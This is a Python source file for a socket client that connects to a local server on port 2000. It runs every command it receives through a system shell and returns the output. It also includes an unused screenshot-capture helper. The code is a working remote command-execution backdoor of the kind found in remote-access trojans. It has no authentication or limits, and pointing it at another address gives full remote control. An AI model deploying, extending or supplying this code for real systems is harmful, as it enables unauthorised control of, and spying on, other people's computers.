import json
import socket
import subprocess
import struct
import pyautogui
import io


def execute_command(command):
    """Execute a system command and return its output or error."""
    try:
        # Run the command and capture output
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
        output = result.stdout if result.stdout else ""
        error = result.stderr if result.stderr else ""
        return output + error
    except Exception as e:
        return f"Error: {str(e)}"



def receive_all(sock, size):
    data = b''
    while len(data) < size:
        part = sock.recv(size - len(data))
        if not part:
            raise ConnectionError("Socket closed before all data received.")
        data += part
    return data



def get_screenshot():
    screenshot = pyautogui.screenshot()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_data = img_bytes.getvalue()
    return img_data


def main():
    # Create a TCP client socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server
        client_socket.connect(("127.0.0.1", 2000))
        print("Connected to server at 127.0.0.1:2000")

        while True:
            # Receive the command from the server
            length_bytes = receive_all(client_socket, 4)
            if not length_bytes:
                print("Server closed connection.")
                return

            length = struct.unpack(">I", length_bytes)[0]
            request_bytes = receive_all(client_socket, length)
            request_str = request_bytes.decode('utf-8')


            if not request_str:
                print("No command received or server disconnected.")
                break
            print(f"Received command: {request_str}")
            request = json.loads(request_str)

            # Execute the command
            result = execute_command(request["command"])
            print(f"Command output: {result}")

            # Encode the result to UTF-8 bytes BEFORE getting the length
            encoded_result = result.encode('utf-8')
            print(f"Encoded byte length: {len(encoded_result)}")

            # Send the result with correct byte length
            size = struct.pack(">I", len(encoded_result))
            client_socket.sendall(size + encoded_result)
            print("Result sent to server.")



    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Close the client socket
        client_socket.close()
        print("Client socket closed.")


if __name__ == "__main__":
    main()
